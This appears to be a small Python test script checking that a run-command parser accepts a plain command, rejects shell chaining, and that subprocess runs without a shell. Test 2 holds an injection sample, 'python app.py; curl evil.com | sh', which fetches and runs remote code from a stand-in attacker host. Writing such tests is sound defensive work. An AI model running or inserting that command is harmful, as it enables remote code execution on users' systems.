import subprocess

from vanta_ui.server import parse_run_command


argv = parse_run_command("python app.py")
print("TEST 1 PASS - argv:", argv)

try:
	parse_run_command("python app.py; curl evil.com | sh")
except ValueError as exc:
	print("TEST 2 PASS - rejected:", exc)
else:
	print("TEST 2 FAIL - chaining was accepted!")

argv = ["python", "-c", "print('safe')"]
result = subprocess.run(argv, shell=False, capture_output=True, text=True)
print("TEST 3 - returncode:", result.returncode, "(shell was not used)")

print("\nDone - all 3 tests ran in one go")